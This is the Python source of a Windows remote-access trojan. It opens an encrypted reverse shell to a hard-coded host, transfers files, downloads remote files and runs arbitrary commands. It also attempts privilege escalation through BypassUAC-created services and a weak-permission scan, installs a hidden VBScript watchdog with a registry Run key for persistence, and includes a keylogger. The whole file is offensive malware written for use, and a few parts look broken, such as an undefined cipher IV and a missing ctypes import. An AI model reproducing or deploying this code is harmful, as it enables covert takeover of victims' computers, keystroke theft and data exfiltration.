#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys, urllib2, pythoncom, pyHook, logging

# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# server config
HOST = '192.168.1.9'
PORT = 443

# session controller
active = False

# Functions
###########

# send data function
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
    sock.sendall(EncodeAES(cipher, cmd + end))

# receive data function
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
    data = ""
    l = sock.recv(1024)
    while(l):
        decrypted = DecodeAES(cipher, l)
        data = data + decrypted
        if data.endswith(end) == True:
            break
        else:
            l = sock.recv(1024)
    return data[:-len(end)]

# prompt function
def Prompt(sock, promptmsg):
    Send(sock, promptmsg)
    answer = Receive(sock)
    return answer

# upload file
def Upload(sock, filename):
    bgtr = True
    # file transfer
    try:
        f = open(filename, 'rb')
        while 1:
            fileData = f.read()
            if fileData == '': break
            # begin sending file
            Send(sock, fileData, "")
        f.close()
    except:
        time.sleep(0.1)
    # let server know we're done..
    time.sleep(0.8)
    Send(sock, "")
    time.sleep(0.8)
    return "Finished download."

# download file
def Download(sock, filename):
    # file transfer
    g = open(filename, 'wb')
    # download file
    fileData = Receive(sock)
    time.sleep(0.8)
    g.write(fileData)
    g.close()
    # let server know we're done..
    return "Finished upload."

# download from url (unencrypted)
def Downhttp(sock, url):
    # get filename from url
    filename = url.split('/')[-1].split('#')[0].split('?')[0]
    g = open(filename, 'wb')
    # download file
    u = urllib2.urlopen(url)
    g.write(u.read())
    g.close()
    # let server know we're done...
    return "Finished download."

# privilege escalation
def Privs(sock):

    # Windows/NT Methods
    if os.name == 'nt':

        # get initial info
        privinfo = '\
Username:        ' + Exec('echo %USERNAME%')
        privinfo += Exec('systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"')

        winversion = Exec('systeminfo')
        windowsnew = -1
        windowsold = -1

        # newer versions of windows go here
        windowsnew += winversion.find('Windows 7')
        windowsnew += winversion.find('Windows 8')
        windowsnew += winversion.find('Windows Vista')
        windowsnew += winversion.find('Windows VistaT')
        windowsnew += winversion.find('Windows Server 2008')

        # older versions go here (only XP)
        windowsold += winversion.find('Windows XP')
        windowsold += winversion.find('Server 2003')

        # if it is, display privs using whoami command.
        if windowsnew > 0:
            privinfo += Exec('whoami /priv') + '\
'

        # check if user is administrator
        admincheck = Exec('net localgroup administrators | find "%USERNAME%"')

        # if user is in the administrator group, attempt service priv. esc. using bypassuac
        if admincheck != '':

            privinfo += 'Administrator privilege detected.\
\
'

            # if windows version is vista or greater, bypassUAC :)
            if windowsnew > 0:

                # prompt for bypassuac location or url
                bypassuac = Prompt(sock, privinfo+'Enter location/url for BypassUAC: ')

                # attempt to download from url
                if bypassuac.startswith("http") == True:
                    try:
                        c = Downhttp(sock, bypassuac)
                        d = os.getcwd() + '\\\\' + bypassuac.split('/')[-1]
                    except:
                        return "Download failed: invalid url.\
"

                # attempt to open local file
                else:
                    try:
                        c = open(bypassuac)
                        c.close()
                        d = bypassuac
                    except:
                        return "Invalid location for BypassUAC.\
"


            # fetch executable's location
            curdir = os.path.join(sys.path[0], sys.argv[0])

            # add service
            if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc create blah binPath= "cmd.exe /c ' + curdir + '" type= own start= auto')
            if windowsold > 0: elvpri = Exec('sc create blah binPath= "' + curdir + '" type= own start= auto')
            # start service
            if windowsnew > 0: elvpri = Exec(d + ' elevate /c sc start blah')
            if windowsold > 0: elvpri = Exec('sc start blah')
            # finished.
            return "\
Privilege escalation complete.\
"

        # windows xp doesnt allow wmic commands by defautlt ;(
        if windowsold > 0:
            privinfo += 'Unable to escalate privileges.\
'
            return privinfo

        # attempt to search for weak permissions on applications
        privinfo += 'Searching for weak permissions...\
\
'

        # array for possible matches
        permatch = []
        permatch.append("BUILTIN\\Users:(I)(F)")
        permatch.append("BUILTIN\\Users:(F)")

        permbool = False

        # stage 1 outputs to text file: p1.txt
        xv = Exec('for /f "tokens=2 delims=\\'=\\'" %a in (\\'wmic service list full^|find /i "pathname"^|find /i /v "system32"\\') do @echo %a >> p1.txt')
        # stage 2 outputs to text file: p2.txt
        xv = Exec('for /f eol^=^"^ delims^=^" %a in (p1.txt) do cmd.exe /c icacls "%a" >> p2.txt')

        # give some time to execute commands,
        # 40 sec should do it... ;)
        time.sleep(40)

        # loop from hell to determine a match to permatch array.
        ap = 0
        bp = 0
        dp = open('p2.txt')
        lines = dp.readlines()
        for line in lines:
            cp = 0
            while cp < len(permatch):
                j = line.find(permatch[cp])
                if j != -1:
                    # we found a misconfigured directory :)
                    if permbool == False:
                        privinfo += 'The following directories have write access:\
\
'
                        permbool = True
                    bp = ap
                    while True:
                        if len(lines[bp].split('\\\\')) > 2:
                            while bp <= ap:
                                privinfo += lines[bp]
                                bp += 1
                            break
                        else:
                            bp -= 1
                cp += 1
            ap += 1
        time.sleep(4)
        if permbool == True: privinfo += '\
Replace executable with Python shell.\
'
        if permbool == False: privinfo += '\
No directories with misconfigured premissions found.\
'
        # close file
        dp.close()
        # delete stages 1 & 2
        xv = Exec('del p1.txt')
        xv = Exec('del p2.txt')

        return privinfo

# persistence
def Persist(sock, redown=None, newdir=None):

    # Windows/NT Methods
    if os.name == 'nt':

        privscheck = Exec('reg query "HKU\\S-1-5-19" | find "error"')

        # if user isn't system, return
        if privscheck != '':
            return "You must be authority\\system to enable persistence.\
"
        # otherwise procede
        else:
            # fetch executable's location
            exedir = os.path.join(sys.path[0], sys.argv[0])
            exeown = exedir.split('\\\\')[-1]

            # get vbscript location
            vbsdir = os.getcwd() + '\\\\' + 'vbscript.vbs'

            # write VBS script
            if redown == None: vbscript = 'state = 1\
hidden = 0\
wshname = "' + exedir + '"\
vbsname = "' + vbsdir + '"\
While state = 1\
exist = ReportFileStatus(wshname)\
If exist = True then\
set objFSO = CreateObject("Scripting.FileSystemObject")\
set objFile = objFSO.GetFile(wshname)\
if objFile.Attributes AND 2 then\
else\
objFile.Attributes = objFile.Attributes + 2\
end if\
set objFSO = CreateObject("Scripting.FileSystemObject")\
set objFile = objFSO.GetFile(vbsname)\
if objFile.Attributes AND 2 then\
else\
objFile.Attributes = objFile.Attributes + 2\
end if\
Set WshShell = WScript.CreateObject ("WScript.Shell")\
Set colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\
For Each objProcess in colProcessList\
if objProcess.name = "' + exeown + '" then\
vFound = True\
End if\
Next\
If vFound = True then\
wscript.sleep 50000\
Else\
WshShell.Run """' + exedir + '""",hidden\
wscript.sleep 50000\
End If\
vFound = False\
Else\
wscript.sleep 50000\
End If\
Wend\
Function ReportFileStatus(filespec)\
Dim fso, msg\
Set fso = CreateObject("Scripting.FileSystemObject")\
If (fso.FileExists(filespec)) Then\
msg = True\
Else\
msg = False\
End If\
ReportFileStatus = msg\
End Function\
'
            else:
                if newdir == None: 
                    newdir = exedir
                    newexe = exeown
                else: 
                    newexe = newdir.split('\\\\')[-1]
                vbscript = 'state = 1\
hidden = 0\
wshname = "' + exedir + '"\
vbsname = "' + vbsdir + '"\
urlname = "' + redown + '"\
dirname = "' + newdir + '"\
While state = 1\
exist1 = ReportFileStatus(wshname)\
exist2 = ReportFileStatus(dirname)\
If exist1 = False And exist2 = False then\
download urlname, dirname\
End If\
If exist1 = True Or exist2 = True then\
if exist1 = True then\
set objFSO = CreateObject("Scripting.FileSystemObject")\
set objFile = objFSO.GetFile(wshname)\
if objFile.Attributes AND 2 then\
else\
objFile.Attributes = objFile.Attributes + 2\
end if\
exist2 = False\
end if\
if exist2 = True then\
set objFSO = CreateObject("Scripting.FileSystemObject")\
set objFile = objFSO.GetFile(dirname)\
if objFile.Attributes AND 2 then\
else\
objFile.Attributes = objFile.Attributes + 2\
end if\
end if\
set objFSO = CreateObject("Scripting.FileSystemObject")\
set objFile = objFSO.GetFile(vbsname)\
if objFile.Attributes AND 2 then\
else\
objFile.Attributes = objFile.Attributes + 2\
end if\
Set WshShell = WScript.CreateObject ("WScript.Shell")\
Set colProcessList = GetObject("Winmgmts:").ExecQuery ("Select * from Win32_Process")\
For Each objProcess in colProcessList\
if objProcess.name = "' + exeown + '" OR objProcess.name = "' + newexe + '" then\
vFound = True\
End if\
Next\
If vFound = True then\
wscript.sleep 50000\
End If\
If vFound = False then\
If exist1 = True then\
WshShell.Run """' + exedir + '""",hidden\
End If\
If exist2 = True then\
WshShell.Run """' + dirname + '""",hidden\
End If\
wscript.sleep 50000\
End If\
vFound = False\
End If\
Wend\
Function ReportFileStatus(filespec)\
Dim fso, msg\
Set fso = CreateObject("Scripting.FileSystemObject")\
If (fso.FileExists(filespec)) Then\
msg = True\
Else\
msg = False\
End If\
ReportFileStatus = msg\
End Function\
function download(sFileURL, sLocation)\
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")\
objXMLHTTP.open "GET", sFileURL, false\
objXMLHTTP.send()\
do until objXMLHTTP.Status = 200 :  wscript.sleep(1000) :  loop\
If objXMLHTTP.Status = 200 Then\
Set objADOStream = CreateObject("ADODB.Stream")\
objADOStream.Open\
objADOStream.Type = 1\
objADOStream.Write objXMLHTTP.ResponseBody\
objADOStream.Position = 0\
Set objFSO = Createobject("Scripting.FileSystemObject")\
If objFSO.Fileexists(sLocation) Then objFSO.DeleteFile sLocation\
Set objFSO = Nothing\
objADOStream.SaveToFile sLocation\
objADOStream.Close\
Set objADOStream = Nothing\
End if\
Set objXMLHTTP = Nothing\
End function\
'

            # open file & write
            vbs = open('vbscript.vbs', 'wb')
            vbs.write(vbscript)
            vbs.close()

            # add registry to startup
            persist = Exec('reg ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v blah /t REG_SZ /d "' + vbsdir + '"')
            persist += '\
Persistence complete.\
'
            return persist

# execute command
def Exec(cmde):
    # check if command exists
    if cmde:
        execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        cmdoutput = execproc.stdout.read() + execproc.stderr.read()
        return cmdoutput

    # otherwise, return
    else:
        return "Enter a command.\
"

# keylogging function
# version 1, by K.B. Carte
##########################
# enter log filename.
LOG_STATE = True
LOG_FILENAME = 'keylog.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=LOG_FILENAME,
                        level=logging.DEBUG,
                        format='%(message)s')
    logging.log(10,chr(event.Ascii))
    return True     

# main loop
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        # create a cipher object using the random secret
        cipher = AES.new(secret,AES.MODE_CFB, iv)

        # waiting to be activated...
        data = Receive(s)

        # activate.
        if data == 'Activate':
            active = True
            Send(s, "\
"+os.getcwd()+">")

        # interactive loop
        while active:

            # Receive data
            data = Receive(s)

            # think before you type smartass
            if data == '':
                time.sleep(0.02)

            # check for quit
            if data == "quit" or data == "terminate":
                Send(s, "quitted")
                break

            # check for change directory
            elif data.startswith("cd ") == True:
                try:
                    os.chdir(data[3:])
                    stdoutput = ""
                except:
                    stdoutput = "Error opening directory.\
"

            # check for download
            elif data.startswith("download") == True:
                # Upload the file
                stdoutput = Upload(s, data[9:])

            elif data.startswith("downhttp") == True:
                # Download from url
                stdoutput = Downhttp(s, data[9:])

            # check for upload
            elif data.startswith("upload") == True:
                # Download the file
                stdoutput = Download(s, data[7:])

            elif data.startswith("privs") == True:
                # Attempt to elevate privs
                stdoutput = Privs(s)

            elif data.startswith("persist") == True:
                # Attempt persistence
                if len(data.split(' ')) == 1: stdoutput = Persist(s)
                elif len(data.split(' ')) == 2: stdoutput = Persist(s, data.split(' ')[1])
                elif len(data.split(' ')) == 3: stdoutput = Persist(s, data.split(' ')[1], data.split(' ')[2])

            elif data.startswith("keylog") == True:
                # Begin keylogging
                if LOG_STATE == False:
                    try:
                        # set to True
                        LOG_STATE = True
                        hm = pyHook.HookManager()
                        hm.KeyDown = OnKeyboardEvent
                        hm.HookKeyboard()
                        pythoncom.PumpMessages()
                        stdoutput = "Logging keystrokes to: "+LOG_FILENAME+"...\
"
                    except:
                        ctypes.windll.user32.PostQuitMessage(0)
                        # set to False
                        LOG_STATE = False
                        stdoutput = "Keystrokes have been logged to: "+LOG_FILENAME+".\
"


            else:
                # execute command.
                stdoutput = Exec(data)

            # send data
            stdoutput = stdoutput+"\
"+os.getcwd()+">"
            Send(s, stdoutput)

        # loop ends here

        if data == "terminate":
            break
        time.sleep(3)
    except socket.error:
        s.close()
        time.sleep(10)
        continue

